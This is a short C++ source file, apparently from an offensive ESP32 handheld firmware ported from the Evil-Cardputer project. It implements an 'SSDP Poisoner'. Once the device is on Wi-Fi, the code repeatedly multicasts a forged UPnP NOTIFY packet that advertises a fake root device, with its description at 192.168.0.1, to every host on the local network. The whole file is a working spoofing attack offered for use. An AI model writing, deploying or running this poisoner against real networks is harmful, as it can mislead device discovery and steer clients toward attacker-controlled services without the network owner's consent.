/*
 * Ported from Evil-Cardputer (Evil-M5Project) by 7h30th3r0n3.
 * Combined firmware: AGPL-3.0-or-later (Bruce).
 */
#include "ssdp.h"
#if defined(EVIL_EXTENSIONS)
#include "root/net/wifi_common.h"
#include "root/ui/display.h"
#include <WiFi.h>
#include <WiFiUdp.h>
#include <globals.h>

void ssdpMenu() {
    if (!WiFi.isConnected() && !wifiConnectMenu(WIFI_STA)) return;
    WiFiUDP udp;
    udp.begin(1900);
    const char *notify =
        "NOTIFY * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nCACHE-CONTROL: max-age=1800\r\n"
        "LOCATION: http://192.168.0.1/desc.xml\r\nNT: upnp:rootdevice\r\nNTS: ssdp:alive\r\n"
        "SERVER: kvxputer/1.0 UPnP/1.0\r\nUSN: uuid:kvxputer::upnp:rootdevice\r\n\r\n";
    int sent = 0;
    drawMainBorderWithTitle("SSDP Poisoner");
    tft.drawString("ESC to stop", 10, uiFooterY(FP));
    EscPress = false;
    while (!check(EscPress) && !returnToMenu) {
        udp.beginPacket(IPAddress(239, 255, 255, 250), 1900);
        udp.write((const uint8_t *)notify, strlen(notify));
        udp.endPacket();
        sent++;
        tft.fillRect(10, 40, tftWidth - 20, 16, kvxConfig.bgColor);
        tft.drawString("NOTIFYs: " + String(sent), 10, uiStatusY(0));
        delay(400);
    }
    udp.stop();
}
#endif
